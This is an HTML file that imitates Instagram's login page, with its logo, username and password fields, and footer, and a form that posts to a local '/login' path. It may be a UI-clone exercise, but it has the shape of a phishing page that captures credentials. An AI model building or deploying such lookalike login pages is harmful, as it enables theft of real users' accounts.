<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Login.Instagram</title>
	<link rel="shortcut icon" type="image" href="download.jpg">
	<link rel="stylesheet" href="styles.css">
	<script src="index.js" defer></script>
</head>
<body>

<div class="wrapper">
	<div class="header">
		<div class="top">
			<div class="logo">
				<img src="instagram.png" alt="instagram" style="width: 175px;">
			</div>
			<form class="" action="/login" method="post">
				<div class="form">
					<div class="input_field">
						<input type="text" id="username" placeholder="Phone number, username, or email" class="input" name= "username">
					</div>
					<div class="input_field">
						<input type="password" id="password" placeholder="Password" class="input" name= "password">
					</div>
					<div type="button" class="btn"><a href="https://www.instagram.com/accounts/login/">Log In</a></div>
					<!-- <button type="button" class="btn">Login</button> -->
				</div>
			</form>
			<div class="or">
				<div class="line"></div>
				<p>OR</p>
				<div class="line"></div>
			</div>
			<div class="dif">
				<div class="fb">
					<img src="facebook.png" alt="facebook">
					<p>Log in with Facebook</p>
				</div>
				<div class="forgot">
					<a href="#">Forgot password?</a>
				</div>
			</div>
		</div>
		<div class="signup">
			<p>Don't have an account? <a href="#">Sign up</a></p>
		</div>
		<div class="apps">
			<p>Get the app.</p>
			<div class="icons">
				<a href="#"><img src="appstore.png" alt="appstore"></a>
				<a href="#"><img src="googleplay.png" alt="googleplay"></a>
			</div>
		</div>
	</div>
	<div class="footer">
		<div class="links">
			<ul>
				<li><a href="#">Meta</a></li>
				<li><a href="#">About</a></li>

				<li><a href="#">Top Accounts</a></li>
				<li><a href="#">Hashtags</a></li>
				<li>
					<a href="#">Locations</a>
				</li>
				<li><a href="#">Instagram Lite</a></li>
				<li>
					<a href="#">English</a>
				</li>

			</ul>
		</div>

	</div>

</div>
